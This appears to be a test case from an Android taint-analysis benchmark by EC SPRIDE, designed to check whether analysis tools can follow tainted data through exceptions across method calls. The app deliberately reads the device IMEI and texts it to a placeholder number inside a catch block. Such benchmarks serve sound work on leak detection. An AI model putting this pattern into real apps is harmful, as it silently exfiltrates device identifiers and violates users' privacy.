package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name Exceptions6
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE)
 * @author_mail steven.arzt@cased.de
 *
 * @description An implicit exception containing tainted data is thrown inside a called method and caught in
 * the caller
 * @dataflow source -> imei -> exception -> exception handler -> sink
 * @number_of_leaks 1
 * @challenges the analysis must handle exception data across method calls
 */
public class Exceptions6 extends Activity {

    private String imei = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        try {
            callMe();
        } catch (RuntimeException ex) {
            SmsManager sm = SmsManager.getDefault();
            // sink, leak
            sm.sendTextMessage("+49 1234", null, imei, null, null);
        }
    }

    private void callMe() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        // source
        imei = telephonyManager.getDeviceId();
    }
}
